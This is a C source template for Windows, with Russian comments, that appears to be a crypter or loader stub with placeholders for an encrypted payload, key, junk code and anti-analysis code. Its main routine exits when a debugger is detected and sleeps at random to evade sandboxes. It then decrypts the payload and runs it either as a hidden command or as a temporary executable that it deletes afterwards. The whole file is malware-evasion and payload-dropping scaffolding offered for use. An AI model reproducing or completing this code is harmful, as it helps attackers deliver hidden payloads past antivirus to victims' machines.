#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <wincrypt.h>
#pragma comment(lib, "crypt32.lib")

// Макрос для проверки наличия отладчика
#define CHECK_DEBUGGER if(IsDebuggerPresent()) { ExitProcess(0); }

// Зашифрованная полезная нагрузка
unsigned char encrypted_payload[] = {{PAYLOAD}};
const size_t payload_size = {{PAYLOAD_SIZE}};

// Ключ и вектор инициализации для расшифровки
unsigned char encryption_key[] = {{KEY}};
const size_t key_size = {{KEY_SIZE}};
unsigned char initialization_vector[] = {{IV}};
const size_t iv_size = {{IV_SIZE}};

// Тип полезной нагрузки
{{PAYLOAD_TYPE}}

// Функция для расшифровки
{{DECRYPT_FUNC}}

// Мусорный код для запутывания анализа
{{JUNK_CODE}}

// Мертвый код, который никогда не выполнится
{{DEAD_CODE}}

// Код для обхода анализа
{{ANTI_ANALYSIS}}

// Функция для выполнения команды
BOOL ExecuteCommand(const char* command) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    ZeroMemory(&pi, sizeof(pi));
    
    // Создаем процесс с командой
    if (!CreateProcessA(NULL, (LPSTR)command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        return FALSE;
    }
    
    // Ждем завершения процесса
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    // Закрываем дескрипторы
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return TRUE;
}

// Обход обнаружения: ждем случайное время
void RandomSleep() {
    DWORD delay = 1000 + (rand() % 3000);
    Sleep(delay);
}

int main() {
    // Избегаем обнаружения
    CHECK_DEBUGGER;
    RandomSleep();
    
    // Выделяем память для расшифрованных данных
    unsigned char* decrypted_data = (unsigned char*)malloc(payload_size);
    if (!decrypted_data) {
        return 1;
    }
    
    // Расшифровываем полезную нагрузку
    DWORD decrypted_size = payload_size;
    decrypt_payload(encrypted_payload, payload_size, encryption_key, initialization_vector, decrypted_data);
    
    // Выполняем полезную нагрузку
    if (strcmp(type_var, "command") == 0) {
        // Если полезная нагрузка - команда, выполняем её
        char* command = (char*)malloc(decrypted_size + 1);
        memcpy(command, decrypted_data, decrypted_size);
        command[decrypted_size] = '\0';
        
        ExecuteCommand(command);
        
        free(command);
    } else {
        // Если полезная нагрузка - файл, сохраняем его и выполняем
        char temp_path[MAX_PATH];
        char temp_file[MAX_PATH];
        
        GetTempPathA(MAX_PATH, temp_path);
        GetTempFileNameA(temp_path, "exe", 0, temp_file);
        
        // Записываем в файл
        FILE* f = fopen(temp_file, "wb");
        if (f) {
            fwrite(decrypted_data, 1, decrypted_size, f);
            fclose(f);
            
            // Выполняем файл
            ExecuteCommand(temp_file);
            
            // Удаляем временный файл
            DeleteFileA(temp_file);
        }
    }
    
    // Очищаем память
    memset(decrypted_data, 0, payload_size);
    free(decrypted_data);
    
    return 0;
} 